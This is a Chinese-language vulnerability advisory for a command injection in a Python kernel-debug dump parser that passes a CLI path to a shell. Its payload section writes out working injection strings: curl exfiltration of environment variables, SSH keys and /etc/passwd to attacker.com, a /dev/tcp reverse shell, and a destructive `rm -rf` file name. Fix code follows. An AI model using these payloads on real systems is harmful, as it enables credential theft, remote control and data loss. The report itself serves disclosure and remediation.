# VULN-DF-PY-002: 命令注入漏洞详细分析报告

## 漏洞概述

| 属性 | 值 |
|------|-----|
| **漏洞ID** | VULN-DF-PY-002 |
| **漏洞类型** | 命令注入 (Command Injection) |
| **CWE编号** | CWE-78: Improper Neutralization of Special Elements used in an OS Command |
| **严重级别** | Critical |
| **置信度** | 85 |
| **影响模块** | show_kernel_debug_data |
| **受影响文件** | utils/show_kernel_debug_data/show_kernel_debug_data/dump_parser.py |
| **漏洞位置** | 861-876行, 函数 `DumpBinFile._pre_process` |

### 漏洞描述

`DumpBinFile._pre_process` 方法使用 `subprocess.run(cmd, shell=True)` 执行命令，其中 `cmd` 通过 f-string 格式化字符串拼接：
```python
cmd = f"python3 {msaccucmp_file} convert -d {dump_bin} -t bin -out {temp_dir}"
```

`dump_bin` 来自 CLI 参数 (`sys.argv[1]`)，若该参数包含 shell 元字符（如 `;`, `$()`, 反引号等），攻击者可注入任意系统命令。

---

## 攻击场景分析

### 场景1: 开发/调试环境中的恶意输入

用户使用该工具解析内核调试数据时：

```bash
# 假设攻击者能控制输入路径
show_kernel_debug_data "./dump.bin; curl http://attacker.com/shell.sh | bash"
```

### 场景2: 通过恶意文件名注入

攻击者创建特殊命名的文件：

```bash
# 创建恶意文件名
touch "/tmp/dump.bin; id > /tmp/pwned.txt"

# 用户 unknowingly 解析该文件
show_kernel_debug_data "/tmp/dump.bin; id > /tmp/pwned.txt"
```

### 场景3: 批量处理脚本中的漏洞利用

如果存在批量处理脚本：

```bash
#!/bin/bash
# 批量处理脚本 - 遍历所有 bin 文件
for f in $(find /data -name "*.bin"); do
    show_kernel_debug_data "$f" /output
done

# 如果 /data 中存在恶意命名的文件:
# /data/dump.bin; rm -rf /important_data
# 则脚本会执行删除命令
```

---

## Payload 示例

### Payload 1: 简单命令注入探测

```bash
# PoC: 验证漏洞存在
show_kernel_debug_data "/tmp/dump.bin; id > /tmp/poc_result"

# 检查结果
cat /tmp/poc_result
# 输出应显示执行 id 命令的结果，证明命令注入成功
```

### Payload 2: 环境变量窃取

```bash
# 窃取环境变量中的敏感信息
show_kernel_debug_data "/tmp/x.bin; printenv | curl -X POST -d @- http://attacker.com/capture; #/tmp/x.bin"
```

### Payload 3: SSH 密钥外泄

```bash
show_kernel_debug_data "/tmp/d.bin; cat ~/.ssh/id_rsa | curl -X POST -d @- http://attacker.com/keys; #/tmp/d.bin"
```

### Payload 4: 反向 Shell

```bash
show_kernel_debug_data "/tmp/d.bin; bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'; #/tmp/d.bin"
```

### Payload 5: 使用反引号命令替换

```bash
show_kernel_debug_data "/tmp/d`whoami`.bin"

# 执行的命令变为:
# python3 {msaccucmp_file} convert -d /tmp/d`whoami`.bin -t bin -out {temp_dir}
# `whoami` 会被执行并替换到命令中
```

### Payload 6: 使用 $() 命令替换

```bash
show_kernel_debug_data "/tmp/d$(cat /etc/passwd | base64 | curl -X POST -d @- http://attacker.com).bin"
```

### Payload 7: 进程列表泄露

```bash
show_kernel_debug_data "/tmp/x.bin; ps aux > /tmp/processes.txt; cat /tmp/processes.txt | curl -X POST -d @- http://attacker.com; rm /tmp/processes.txt; #/tmp/x.bin"
```

---

## 影响评估

### 直接影响

1. **任意命令执行**: 攻击者可在目标系统上执行任意 shell 命令
2. **数据泄露**: 可读取系统上的任意文件，包括密钥、配置、用户数据等
3. **系统破坏**: 可删除文件、修改系统配置
4. **反向连接**: 可建立反向 shell 实现远程控制

### 间接影响

1. **开发环境入侵**: 该工具用于调试，常在开发环境中使用，可能暴露开发服务器
2. **敏感数据访问**: 开发环境中可能存在未加密的密钥、配置等
3. **横向移动**: 可作为内网渗透的入口点

### CVSS 3.1 评分估算

| 指标 | 值 | 说明 |
|------|-----|------|
| Attack Vector | Local | 需要本地执行脚本 |
| Attack Complexity | Low | 无需特殊条件 |
| Privileges Required | Low | 需能调用解析工具 |
| User Interaction | Required | 需用户执行脚本或处理恶意文件 |
| Scope | Changed | 可影响其他组件 |
| CIA Impact | High | 完整性、可用性、机密性全高 |

**估算评分**: 7.8 (High)

---

## 修复建议

### 方案1: 移除 shell=True (推荐)

```python
def _pre_process(self, dump_bin: str):
    """预处理 dump 文件"""
    dump_dir = os.path.dirname(dump_bin)
    temp_dir = os.path.join(dump_dir, "predump")
    dump_file_name = os.path.basename(dump_bin)
    install_path = get_install_path()
    search_re = f"{install_path}/**/operator_cmp/compare/msaccucmp.py"
    search_result = glob.glob(search_re, recursive=True)
    if not search_result or not os.path.exists(search_result[0]):
        return dump_bin
    msaccucmp_file = os.path.realpath(search_result[0])
    
    # 使用列表形式传递命令，移除 shell=True
    cmd = [
        "python3",
        msaccucmp_file,
        "convert",
        "-d",
        dump_bin,
        "-t",
        "bin",
        "-out",
        temp_dir
    ]
    
    log_file_tmp = DUMP_PARSER_LOG.get_log_file()
    with open(log_file_tmp, "a+") as f:
        try:
            process = subprocess.run(
                cmd,
                stdout=f,
                stderr=subprocess.STDOUT,
                encoding='utf-8',
                timeout=120
            )
        except subprocess.TimeoutExpired as e:
            DUMP_PARSER_LOG.error(f'Command timed out')
    
    dump_result_re = os.path.join(temp_dir, f"{dump_file_name}.space.*.bin")
    dump_result = glob.glob(dump_result_re, recursive=True)
    if dump_result and os.path.exists(dump_result[0]):
        DUMP_PARSER_LOG.info(f'Find new dump_bin use {dump_result[0]}')
        return dump_result[0]
    return dump_bin
```

### 方案2: 输入验证与路径规范化

```python
import os
import re

def validate_dump_bin_path(dump_bin: str) -> str:
    """验证并规范化 dump_bin 路径"""
    if not dump_bin:
        raise ValueError("dump_bin path is empty")
    
    # 检查是否包含 shell 元字符
    dangerous_chars = [';', '|', '&', '$', '`', '(', ')', '<', '>', '\n', '\r', "'", '"']
    for char in dangerous_chars:
        if char in dump_bin:
            raise ValueError(f"Invalid character '{char}' in dump_bin path")
    
    # 检查是否为合法路径
    abs_path = os.path.abspath(dump_bin)
    if not os.path.exists(abs_path):
        raise ValueError(f"dump_bin does not exist: {abs_path}")
    
    # 确保是文件且扩展名为 .bin
    if not os.path.isfile(abs_path):
        raise ValueError(f"dump_bin is not a file: {abs_path}")
    
    if not abs_path.endswith('.bin'):
        raise ValueError(f"dump_bin must have .bin extension: {abs_path}")
    
    return abs_path


def _pre_process(self, dump_bin: str):
    """预处理 dump 文件"""
    # 验证输入路径
    dump_bin = validate_dump_bin_path(dump_bin)
    
    dump_dir = os.path.dirname(dump_bin)
    temp_dir = os.path.join(dump_dir, "predump")
    ...
```

### 方案3: 使用 shlex.quote 进行参数转义

```python
import shlex

def _pre_process(self, dump_bin: str):
    """预处理 dump 文件"""
    dump_dir = os.path.dirname(dump_bin)
    temp_dir = os.path.join(dump_dir, "predump")
    dump_file_name = os.path.basename(dump_bin)
    install_path = get_install_path()
    search_re = f"{install_path}/**/operator_cmp/compare/msaccucmp.py"
    search_result = glob.glob(search_re, recursive=True)
    if not search_result or not os.path.exists(search_result[0]):
        return dump_bin
    msaccucmp_file = os.path.realpath(search_result[0])
    
    # 使用 shlex.quote 对所有参数进行安全转义
    safe_msaccucmp_file = shlex.quote(msaccucmp_file)
    safe_dump_bin = shlex.quote(dump_bin)
    safe_temp_dir = shlex.quote(temp_dir)
    
    cmd = f"python3 {safe_msaccucmp_file} convert -d {safe_dump_bin} -t bin -out {safe_temp_dir}"
    
    log_file_tmp = DUMP_PARSER_LOG.get_log_file()
    with open(log_file_tmp, "a+") as f:
        try:
            process = subprocess.run(cmd, stdout=f, stderr=subprocess.STDOUT, shell=True, encoding='utf-8',
                                     timeout=120)
        except subprocess.TimeoutExpired as e:
            DUMP_PARSER_LOG.error(f'Command {cmd} TIME OUT.')
    
    ...
```

### 方案4: 结合验证与转义 (最佳方案)

```python
import shlex
import os

def validate_and_quote_path(path: str) -> str:
    """验证路径并返回安全转义的路径"""
    if not path:
        raise ValueError("Path is empty")
    
    # 检查 shell 元字符
    dangerous_chars = [';', '|', '&', '$', '`', '(', ')', '<', '>', '\n', '\r']
    for char in dangerous_chars:
        if char in path:
            raise ValueError(f"Path contains dangerous character: '{char}'")
    
    # 规范化路径
    abs_path = os.path.abspath(path)
    
    return abs_path


def _pre_process(self, dump_bin: str):
    """预处理 dump 文件"""
    # 先验证路径
    try:
        dump_bin = validate_and_quote_path(dump_bin)
    except ValueError as e:
        DUMP_PARSER_LOG.error(f"Invalid dump_bin path: {e}")
        return dump_bin
    
    dump_dir = os.path.dirname(dump_bin)
    temp_dir = os.path.join(dump_dir, "predump")
    dump_file_name = os.path.basename(dump_bin)
    install_path = get_install_path()
    search_re = f"{install_path}/**/operator_cmp/compare/msaccucmp.py"
    search_result = glob.glob(search_re, recursive=True)
    if not search_result or not os.path.exists(search_result[0]):
        return dump_bin
    msaccucmp_file = os.path.realpath(search_result[0])
    
    # 使用列表形式执行 (推荐)
    cmd = [
        "python3",
        msaccucmp_file,
        "convert",
        "-d",
        dump_bin,
        "-t",
        "bin",
        "-out",
        temp_dir
    ]
    
    log_file_tmp = DUMP_PARSER_LOG.get_log_file()
    with open(log_file_tmp, "a+") as f:
        try:
            process = subprocess.run(
                cmd,
                stdout=f,
                stderr=subprocess.STDOUT,
                encoding='utf-8',
                timeout=120
            )
        except subprocess.TimeoutExpired as e:
            DUMP_PARSER_LOG.error(f'Command timed out')
    
    dump_result_re = os.path.join(temp_dir, f"{dump_file_name}.space.*.bin")
    dump_result = glob.glob(dump_result_re, recursive=True)
    if dump_result and os.path.exists(dump_result[0]):
        DUMP_PARSER_LOG.info(f'Find new dump_bin use {dump_result[0]}')
        return dump_result[0]
    return dump_bin
```

---

## 参考链接

1. **CWE-78**: https://cwe.mitre.org/data/definitions/78.html
2. **OWASP Command Injection**: https://owasp.org/www-community/attacks/Command_Injection
3. **Python subprocess 安全最佳实践**: https://docs.python.org/3/library/subprocess.html#security-considerations
4. **shlex.quote 文档**: https://docs.python.org/3/library/shlex.html#shlex.quote
5. **Secure Coding Guide - Python**: https://python.readthedocs.io/en/stable/library/subprocess.html#security-considerations

---

## 数据流追踪

```
__main__.py (execute_parse) [SOURCE]
    ↓ sys.argv[1] → bin_file_path (line 1172)
dump_parser.py:execute_parse() (line 1161-1209)
    ↓ bin_file_path → parse_dump_bin(dump_bins[0], ...)
dump_parser.py:parse_dump_bin() (line 1118-1159)
    ↓ dump_bin → DumpBinFile(dump_bin)
dump_parser.py:DumpBinFile.__init__() (line 856-859)
    ↓ self.dump_bin = self._pre_process(dump_bin)
dump_parser.py:DumpBinFile._pre_process() [SINK]
    ↓ cmd = f"python3 {msaccucmp_file} convert -d {dump_bin} -t bin -out {temp_dir}"
    ↓ subprocess.run(cmd, shell=True) (line 875)
```

---

## 结论

该漏洞为真实的命令注入漏洞，攻击者可通过控制 CLI 输入参数注入任意 shell 命令。由于该工具用于调试目的，常在开发环境中使用，潜在影响较大。建议立即采用方案1或方案4进行修复，移除 `shell=True` 并使用列表形式执行命令。